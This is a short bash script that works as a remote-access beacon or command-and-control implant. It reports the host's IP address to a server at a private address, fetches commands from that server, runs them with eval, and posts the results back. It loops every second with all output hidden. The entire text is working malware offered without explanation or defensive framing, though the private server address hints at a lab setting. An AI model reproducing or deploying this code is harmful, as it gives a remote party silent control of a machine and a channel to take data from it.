#!/bin/bash

server_ip="192.168.1.135"
my_ip=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
while true; do
  curl -X POST -H "Content-Type: text/plain" -d "$my_ip" "http://${server_ip}:8080/alive_hosts" > /dev/null 2>&1
  command=$(curl -s "http://${server_ip}:8080/commands" 2> /dev/null)
  if [[ -n $command ]]; then
    result=$(eval "$command" 2>&1)
    if [[ -z $result ]]; then
      result="Command either had no output or failed. Check beacon for more details."
    fi
    curl -X POST -H "Content-Type: text/plain" -d "$result" "http://${server_ip}:8080/results" > /dev/null 2>&1
  else
    :
  fi
  sleep 1
done > /dev/null 2>&1
